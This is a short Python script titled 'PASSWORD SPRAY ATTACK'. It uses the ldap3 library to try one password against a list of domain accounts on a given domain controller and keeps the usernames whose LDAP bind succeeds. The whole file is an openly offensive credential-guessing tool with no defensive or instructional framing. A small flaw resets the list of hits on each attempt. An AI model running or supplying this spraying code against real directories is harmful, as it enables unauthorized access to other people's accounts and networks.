"""
PASSWORD SPRAY ATTACK
"""

from ldap3 import Server, Connection, ALL, Tls, EXTERNAL, SASL, DIGEST_MD5
import os, sys

class PasswordSPRAY:
    def AttackArguments(self, serverIP, domainusers, sprayPassword, domainName):
        """ Spray Attack Arguments """
        self.__domain = domainName
        self.__kdcHost = serverIP
        self.__domainUsers = domainusers
        self.__sprayPassword = sprayPassword

        # add '@' to users
        self.DomainUserRequest()

    def DomainUserRequest(self):
        """ Pars to Domain """
        domain = '@' + self.__domain
        for user in self.__domainUsers:
            targetuser = user + domain
            self.AttackToTarget(targetuser)

    def AttackToTarget(self, username):
        """ Attack Part """
        self.__sprayusers = []
        # Connection to Server
        simpleServer = Server(self.__kdcHost, get_info='ALL')
        simpleConn = Connection(simpleServer, user=username, password=self.__sprayPassword)

        if simpleConn.bind():
            self.__sprayusers.append(username)
